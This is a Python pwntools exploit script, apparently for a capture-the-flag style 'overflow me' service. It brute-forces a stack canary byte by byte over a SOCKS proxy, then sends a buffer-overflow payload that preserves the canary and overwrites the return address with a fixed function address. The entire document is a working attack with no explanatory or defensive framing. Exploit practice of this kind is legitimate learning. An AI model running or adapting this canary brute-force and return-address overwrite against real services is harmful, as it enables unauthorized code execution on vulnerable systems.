from pwn import *
offset = 128
canary = b''


for i in range(1, 5):
   for brute in range(256):
       print(brute)
       time.sleep(.3)
       context.proxy = (socks.SOCKS5, 'localhost', 8123) # SOCKS proxy
       host = '192.168.2.99' # Remote machine name
       port = '51928' # Remote port
       p = remote(host, port)
       # p.recvuntil(b"Go ahead, try to overflow me! I'll let you pick how many bytes to read\n")
       p.sendline(str(offset + len(canary) + 1).encode())
       p.recvuntil(b"Now enter the string\n")


       payload = b'A' * 128 + canary + p8(brute, endian='big')
       p.send(payload)
       try:
           output = p.recvlines(2)[-1]
       except Exception as e:
           try:
               output = p.recvlines(1)[-1]
           except Exception:
               continue


       if b'You said something' in output:
           print(i, brute)
           canary = canary + p8(brute, endian='big')
           p.close()
           break
       p.close()


print(canary)
offset = 128 + 4 + 16  + 4
context.proxy = (socks.SOCKS5, 'localhost', 8123)  # SOCKS proxy
host = '192.168.2.99'  # Remote machine name
port = '51928'  # Remote port
p = remote(host, port)
p.sendline(str(offset).encode())
p.recvuntil(b"Now enter the string\n")
payload = b'A' * 128 + canary + b'A' * 16 + p32(0x8049336)
p.sendline(payload)

